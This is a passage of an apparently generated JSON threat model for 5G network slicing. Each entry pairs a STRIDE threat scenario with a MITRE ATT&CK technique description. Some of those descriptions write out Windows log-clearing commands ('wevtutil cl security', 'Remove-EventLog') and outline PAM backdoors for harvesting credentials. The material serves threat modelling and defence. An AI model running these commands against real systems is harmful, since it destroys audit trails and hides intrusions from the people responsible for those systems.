                    "Role": "System Configuration",
                    "Condition": "Weak log protection"
                },
                {
                    "Assumption": "Insufficient access control on configuration interfaces",
                    "Role": "System Configuration",
                    "Condition": "Weak access controls"
                }
            ],
            "Potential Impact": "Difficulty in tracing the source of disruptions and accountability",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "configuration",
                "network slice",
                "logging",
                "access control"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An unauthorized change to VNF configurations goes untraceable due to lack of proper audit trails.",
            "Assumptions": [
                {
                    "Assumption": "No configuration change audit mechanisms",
                    "Role": "System Logging",
                    "Condition": "Lack of auditing capabilities"
                },
                {
                    "Assumption": "Changes can be made by multiple actors without accountability",
                    "Role": "System Configuration",
                    "Condition": "Weak accountability measures"
                },
                {
                    "Assumption": "Logs are accessible and modifiable by unauthorized users",
                    "Role": "System Configuration",
                    "Condition": "Inadequate log protection"
                }
            ],
            "Potential Impact": "Challenges in identifying the source of unauthorized changes",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "VNF configuration",
                "audit trail",
                "logging",
                "unauthorized change"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious actor triggers unauthorized network slice creation but denies having performed the action.",
            "Assumptions": [
                {
                    "Assumption": "System lacks proper traceability of slice creation requests",
                    "Role": "System Configuration",
                    "Condition": "Poor request tracing"
                },
                {
                    "Assumption": "No mandatory user verification for critical actions",
                    "Role": "System Configuration",
                    "Condition": "Weak user verification mechanisms"
                },
                {
                    "Assumption": "Logs of slice creation are not comprehensive",
                    "Role": "System Configuration",
                    "Condition": "Incomplete logging"
                }
            ],
            "Potential Impact": "Inability to track unauthorized network slice creation actions",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "network slice",
                "unauthorized creation",
                "logging",
                "traceability"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data in network slices is exposed due to insecure external interfaces.",
            "Assumptions": [
                {
                    "Assumption": "External interfaces don't use strong encryption methods",
                    "Role": "System Configuration",
                    "Condition": "Weak encryption"
                },
                {
                    "Assumption": "Data flows are not monitored for unusual access patterns",
                    "Role": "Network Monitoring",
                    "Condition": "Lack of flow monitoring"
                },
                {
                    "Assumption": "Sensitive data is not adequately classified and protected",
                    "Role": "Data Management",
                    "Condition": "Weak data protection"
                }
            ],
            "Potential Impact": "Exposure of sensitive data to unauthorized entities",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network slice",
                "external interface",
                "encryption",
                "data exposure"
            ],
            "mitre_technique": {
                "name": "Weaken Encryption",
                "description": "Adversaries may compromise a network device\u2019s encryption capability in order to bypass encryption that would otherwise protect data communications. (Citation: Cisco Synful Knock Evolution)\n\nEncryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.\n\nAdversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as [Modify System Image](https://attack.mitre.org/techniques/T1601), [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001), and [Disable Crypto Hardware](https://attack.mitre.org/techniques/T1600/002), an adversary can negatively effect and/or eliminate a device\u2019s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. (Citation: Cisco Blog Legacy Device Attacks)",
                "id": "attack-pattern--1f9012ef-1e10-4e48-915e-e03563435fe8",
                "technique_id": "T1600"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts data transmitted between edge and cloud computing nodes.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission is not encrypted",
                    "Role": "System Configuration",
                    "Condition": "Weak transmission encryption"
                },
                {
                    "Assumption": "Communications can be intercepted by third parties",
                    "Role": "Attacker",
                    "Condition": "Network compromise"
                },
                {
                    "Assumption": "There are no integrity checks on received data",
                    "Role": "System Configuration",
                    "Condition": "Lack of integrity validation"
                }
            ],
            "Potential Impact": "Leak of sensitive data and potential manipulation",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "edge computing",
                "cloud computing",
                "interception",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Internal data within network functions (NFs) spills into other slices due to misconfigurations.",
            "Assumptions": [
                {
                    "Assumption": "Misconfigurations allow data to cross slice boundaries",
                    "Role": "System Configuration",
                    "Condition": "Configurational errors"
                },
                {
                    "Assumption": "No proper isolation mechanisms between slices",
                    "Role": "System Architecture",
                    "Condition": "Weak isolation policies"
                },
                {
                    "Assumption": "Sensitive data is not tagged for special handling",
                    "Role": "Data Management",
                    "Condition": "Poor data classification"
                }
            ],
            "Potential Impact": "Cross-slice data leakage compromising confidentiality",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network function",
                "slice boundary",
                "isolation",
                "misconfiguration"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Attacker floods orchestrator with bogus slice creation requests to exhaust resources.",
            "Assumptions": [
                {
                    "Assumption": "No rate-limiting mechanisms for orchestrator requests",
                    "Role": "System Configuration",
                    "Condition": "Lack of rate limiting"
                },
                {
                    "Assumption": "The system cannot distinguish between legitimate and bogus requests",
                    "Role": "System Configuration",
                    "Condition": "Poor validity checks"
                },
                {
                    "Assumption": "Orchestrator resources are finite and easily exhaustible",
                    "Role": "System Architecture",
                    "Condition": "Limited resources"
                }
            ],
            "Potential Impact": "Resource exhaustion leading to system unavailability",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "orchestrator",
                "resource exhaustion",
                "request flood",
                "system unavailability"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious actors target edge computing nodes with high-volume data requests.",
            "Assumptions": [
                {
                    "Assumption": "Edge nodes are not adequately shielded from high-volume attacks",
                    "Role": "System Architecture",
                    "Condition": "Lack of shielding"
                },
                {
                    "Assumption": "Data requests are not filtered or rate-limited",
                    "Role": "System Configuration",
                    "Condition": "No rate limiting"
                },
                {
                    "Assumption": "The attacker can generate substantial request traffic",
                    "Role": "Attacker",
                    "Condition": "High bandwidth capabilities"
                }
            ],
            "Potential Impact": "Edge node resource depletion resulting in degraded performance",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "edge computing",
                "high-volume data",
                "resource depletion",
                "degraded performance"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Flooding the communication channels between Network Functions (NFs) disrupts their operations.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels do not have rate-limiting",
                    "Role": "System Configuration",
                    "Condition": "Lack of rate limiting mechanisms"
                },
                {
                    "Assumption": "NFs rely on uninterrupted communication for their operations",
                    "Role": "System Architecture",
                    "Condition": "Interdependent NFs"
                },
                {
                    "Assumption": "The attacker can continuously generate excessive traffic",
                    "Role": "Attacker",
                    "Condition": "Persistent attack capabilities"
                }
            ],
            "Potential Impact": "Disruption of NF operations and system reliability",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "network function",
                "communication channel",
                "traffic flooding",
                "disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attacker gains unauthorized admin-level access to the orchestrator.",
            "Assumptions": [
                {
                    "Assumption": "Weak authentication mechanisms for admin access",
                    "Role": "System Configuration",
                    "Condition": "Poor authentication"
                },
                {
                    "Assumption": "Attacker can bypass or exploit security weaknesses",
                    "Role": "Attacker",
                    "Condition": "Knowledge of vulnerabilities"
                },
                {
                    "Assumption": "Admin actions are not properly monitored or controlled",
                    "Role": "System Configuration",
                    "Condition": "Insufficient oversight"
                }
            ],
            "Potential Impact": "Full control over network slices and system configuration",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "orchestrator",
                "admin access",
                "authentication",
                "full control"
            ],
            "mitre_technique": {
                "name": "Pluggable Authentication Modules",
                "description": "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)",
                "id": "attack-pattern--06c00069-771a-4d57-8ef5-d3718c1a8771",
                "technique_id": "T1556.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in a VNF to escalate privileges and gain access to other network slices.",
            "Assumptions": [
                {
                    "Assumption": "The presence of known or unknown vulnerabilities in VNFs",
                    "Role": "System Configuration",
                    "Condition": "Vulnerable VNFs"
                },
                {
                    "Assumption": "Attackers have tools or knowledge to exploit these vulnerabilities",
                    "Role": "Attacker",
                    "Condition": "Exploitation capabilities"
                },
                {
                    "Assumption": "Network slices have inadequate isolation mechanisms",
                    "Role": "System Architecture",
                    "Condition": "Poor isolation"
                }
            ],
            "Potential Impact": "Unauthorized cross-slice access and control",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "VNF",
                "vulnerability",
                "exploitation",
                "cross-slice access"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A compromised external interface allows an attacker to escalate privileges within the 5G network.",
            "Assumptions": [
                {
                    "Assumption": "External interfaces are exposed to the internet",
                    "Role": "System Configuration",
                    "Condition": "Internet-facing interfaces"
                },
                {
                    "Assumption": "Interface security measures are insufficient",
                    "Role": "System Configuration",
                    "Condition": "Weak security"
                },
                {
                    "Assumption": "External connections are trusted without thorough validation",
                    "Role": "System Architecture",
                    "Condition": "Insufficient validation"
                }
            ],
            "Potential Impact": "Network-wide compromise and administrative control",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "external interface",
                "internet exposure",
                "security measures",
                "administrative control"
            ],
            "mitre_technique": {
                "name": "Trusted Relationship",
                "description": "Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\n\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.(Citation: CISA IT Service Providers)\n\nIn Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.(Citation: Office 365 Delegated Administration)",
                "id": "attack-pattern--9fa07bef-9c81-421e-a8e5-ad4366c5a925",
                "technique_id": "T1199"
            }
        }
    ]
}
]